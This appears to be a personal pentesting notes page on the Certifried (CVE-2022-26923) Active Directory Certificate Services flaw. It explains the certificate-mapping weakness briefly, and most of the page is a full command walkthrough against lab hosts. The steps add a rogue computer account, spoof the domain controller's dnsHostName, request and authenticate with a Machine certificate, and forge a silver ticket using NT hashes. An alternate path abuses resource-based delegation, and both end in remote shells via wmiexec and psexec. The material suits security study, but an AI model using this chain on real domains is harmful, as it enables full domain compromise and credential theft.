---
description: Certifried (CVE-2022-26923)
---

# Certifried

This vulnerability is based manipulating **certificate mapping** when creating a computer account. Certificate mapping relied on `dNSHostName` attribute of a computer account. So when a computer requested a certificate, it trusted that `dNSHostName` as its identity.

Exploit by

1. Clear the SPN linked to computer account
2. Modify the `dNSHostName` to impersonate other machine.
3. Request a certificate using Machine template.

### <mark style="color:yellow;">Abuse</mark>

Check if CA is patched

```sh
certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -dc-ip 10.129.228.237 -template User
```

Add computer which dnsHostName should match DCs.

```sh
addcomputer.py -computer-name 'CERTIFRIED$' -computer-pass 'Password123!' -dc-ip 10.129.228.134 'LAB.LOCAL/Blwasp':'Password123!'
```

Enumerate and check DNS names

```sh
certipy find -u 'BlWasp@lab.local' -p 'Password123!' -stdout -vulnerable
```

Edit dnsHostName with powerview

```sh
┌──(mczen㉿mczen)-[~/Dropbox/Win]
└─$ powerview lab.local/BlWasp:'Password123!'@10.129.228.237 
Logging directory is set to /home/mczen/.powerview/logs/lab-blwasp-10.129.228.237
[2025-01-31 18:51:15] [Storage] Using cache directory: /home/mczen/.powerview/storage/ldap_cache
(LDAPS)-[DC02.lab.local]-[LAB-DC\blwasp]
PV > Set-DomainObject -Identity 'CERTIFRIED$' -Set dnsHostName="dc02.lab.local"
[2025-01-31 18:51:33] [Set-DomainObject] Success! modified attribute dnshostname for CN=CERTIFRIED,CN=Computers,DC=lab,DC=local
(LDAPS)-[DC02.lab.local]-[LAB-DC\blwasp]
```

Request certificate and impersonate DC

```shell-session
certipy req -u 'CERTIFRIED$' -p 'Password123!' -dc-ip 10.129.228.134 -ca lab-LAB-DC-CA -template 'Machine'
```

Authenticate

```sh
certipy auth -pfx dc02.pfx
```

Proceed for silver ticket, get SID

```sh
nxc ldap 10.129.228.237 -u dc02$ -H cdd3cf40d6d5bee74013db1c26f58ee1 --get-sid
```

Get silver ticket

```sh
ticketer.py -nthash db35f9cf2e343f0795d33aef721a8f9a -domain-sid S-1-5-21-2810262047-4248699891-1002428937 -domain lab.local -spn cifs/dc02.lab.local Administrator
```

### <mark style="color:yellow;">Alternate Method</mark>

```shell
certipy auth -pfx dc02.pfx -dc-ip 10.129.228.237 -ldap-shell
```

In ldap shell

```sh
add_computer ESC1 E$C1
set_rbcd DC02$ ESC1$
exit
```

Request CIFS ticket

```shell
getST.py -spn cifs/dc02.lab.local -impersonate Administrator -dc-ip 10.129.228.237 'lab.local/esc1$:E$C1'
```

Then connect

```sh
# WMI
KRB5CCNAME=Administrator@cifs_dc02.lab.local@LAB.LOCAL.ccache wmiexec.py -k -no-pass dc02.lab.local  

# PSEXEC
KRB5CCNAME=Administrator@cifs_dc02.lab.local@LAB.LOCAL.ccache psexec.py -k -no-pass dc02.lab.local
```

